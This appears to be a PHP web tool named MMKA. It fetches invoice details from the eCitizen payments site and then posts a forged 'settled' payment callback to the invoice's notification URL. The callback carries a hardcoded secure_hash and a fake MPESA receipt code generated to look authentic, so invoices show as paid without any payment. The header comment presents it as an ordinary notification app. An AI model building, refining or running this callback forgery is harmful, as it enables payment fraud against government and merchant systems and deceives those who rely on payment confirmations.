<?php
die("This file is not meant to be accessed directly.");
// This file is part of MMKA (Mobile Money Kenya Application).
// MMKA is a web application that allows users to interact with the eCitizen payment system.
// It is designed to fetch invoice details and send notifications via MPESA.
//
// MMKA is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version
function generateMpesaCode()
{
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $alphabet2 = '1234567890';
    $code = '';

    // Year (Q for 2022, R for 2023, etc.)
    $currentYear = date('Y');
    $code .= $alphabet[$currentYear - 2022 + 16];

    // Month (K for November, G for July, etc.)
    $currentMonth = date('n');
    $code .= $alphabet[$currentMonth - 1];

    // Day (1 for 1st, 2 for 2nd, etc.)
    $currentDay = date('j');
    if ($currentDay > 9) {
        $replaceChar = $alphabet[($currentDay - 10) % 26];
        $code .= $replaceChar;
    } else {
        $code .= $currentDay;
    }

    /*
    // Transaction order (A for 10th, B for 11th, etc.)
    $currentTime = date('Hi');
    $transactionOrder = intval($currentTime) + 1;
    $transactionOrder %= 100; // Limit transaction order to two digits
    $transactionOrder = str_pad($transactionOrder, 2, '0', STR_PAD_LEFT); // Pad with zeros
    $code .= $transactionOrder;
    */
    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];

    //*
    // Complete the remaining characters to make the code 10 characters long
    while (strlen($code) < 10) {
        $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
    }
    //*/

    return $code;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    $action = $_POST['ajax_action'];

    if ($action === 'fetch_invoice') {
        $code = trim($_POST['code']);
        $fetch_url = "https://payments.ecitizen.go.ke/api/invoice/checkout/{$code}?callback_url=https://bomayangu.go.ke/payments";

        $invoice_html = @file_get_contents($fetch_url);

        if ($invoice_html !== false && preg_match('/<mpesa-v2\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) {
                $attributes[$pair[1]] = $pair[2];
            }

            $msisdn = $attributes['msisdn'] ?? '';
        }

        if ($invoice_html !== false && preg_match('/<airtel-v3\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) {
                $attributes[$pair[1]] = $pair[2];
            }

            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            $date_iso = $now->format(DateTime::ATOM);
            $date_custom = $now->format("Y-m-d H:i:sP T e");

            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $date_iso,
                    'date_custom' => $date_custom
                ]
            ]);
            exit;
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to extract invoice details.']);
            exit;
        }
    }

    if ($action === 'send_notification') {
        $notification_url = $_POST['notification_url'];
        $amount = $_POST['amount'];
        $bill_ref = $_POST['bill_ref'];
        $msisdn = $_POST['msisdn'];

        $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
        $payment_date_iso = $now->format(DateTime::ATOM);
        $payment_date_custom = $now->format("Y-m-d H:i:sP T e");

        $payload = [
            "status" => "settled",
            "secure_hash" => "MzA5YzdkODFmZTdiM2E2MmU0NDJjNzZkN2IxOTAxMzkxZjUzNTgyNTU0NjE1MDE3Y2FjNDVkYmUyNDE5ZTJjNA==",
            "phone_number" => $msisdn,
            "payment_reference" => [[
                "payment_reference" => generateMpesaCode(),
                "payment_date" => $payment_date_iso,
                "inserted_at" => $payment_date_iso,
                "currency" => "KES",
                "amount" => $amount
            ]],
            "payment_date" => $payment_date_custom,
            "payment_channel" => "MPESA",
            "last_payment_amount" => "0",
            "invoice_number" => $bill_ref,
            "invoice_amount" => $amount . ".00",
            "currency" => "KES",
            "client_invoice_ref" => $bill_ref,
            "amount_paid" => $amount
        ];

        $ch = curl_init($notification_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        echo json_encode([
            'status' => $http_status === 200 ? 'success' : 'error',
            'message' => $response
        ]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MMKA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body class="bg-light">
    <div class="container py-5">
        <h2 class="mb-4 text-center">MMKA</h2>

        <form id="fetchForm" class="mb-4">
            <div class="input-group">
                <input type="text" class="form-control" name="code" placeholder="Enter Code Number" required>
                <button type="submit" class="btn btn-primary">Fetch Invoice</button>
            </div>
        </form>

        <div id="result"></div>

        <form id="notifyForm" class="mt-4">
            <h5 class="mb-3">Form A - Details</h5>
            <div class="mb-2"><label class="form-label">Notification URL</label><input type="text" class="form-control" name="notification_url" readonly></div>
            <div class="mb-2"><label class="form-label">Amount</label><input type="text" class="form-control" name="amount" readonly></div>
            <div class="mb-2"><label class="form-label">Bill Reference</label><input type="text" class="form-control" name="bill_ref" readonly></div>
            <div class="mb-2"><label class="form-label">Invoice Number</label><input type="text" class="form-control" name="invoice_no" readonly></div>
            <div class="mb-2"><label class="form-label">Date ISO</label><input type="text" class="form-control" name="date_iso" readonly></div>
            <div class="mb-2"><label class="form-label">Date Custom</label><input type="text" class="form-control" name="date_custom" readonly></div>
            <div class="mb-2"><label class="form-label">MSISDN</label><input type="text" class="form-control" name="msisdn" readonly></div>
            <button type="submit" class="btn btn-success">Submit Notification</button>
        </form>
    </div>

    <script>
        $(function() {
            $('#fetchForm').on('submit', function(e) {
                e.preventDefault();
                const code = $(this).find('input[name="code"]').val();

                $.post('', {
                    ajax_action: 'fetch_invoice',
                    code
                }, function(res) {
                    if (res.status === 'success') {
                        const d = res.data;
                        $('#notifyForm').removeClass('d-none');
                        Object.entries(d).forEach(([k, v]) => {
                            $('#notifyForm').find(`[name="${k}"]`).val(v);
                        });
                        $('#result').html('<div class="alert alert-success">Invoice data loaded successfully.</div>');
                    } else {
                        $('#result').html(`<div class="alert alert-danger">${res.message}</div>`);
                        $('#notifyForm').addClass('d-none');
                    }
                }, 'json');
            });

            $('#notifyForm').on('submit', function(e) {
                e.preventDefault();
                const formData = $(this).serializeArray();
                const data = {
                    ajax_action: 'send_notification'
                };
                formData.forEach(item => data[item.name] = item.value);

                $.post('', data, function(res) {
                    $('#result').html(`<div class="alert ${res.status === 'success' ? 'alert-success' : 'alert-danger'}">${res.message}</div>`);
                }, 'json');
            });
        });
    </script>
</body>

</html>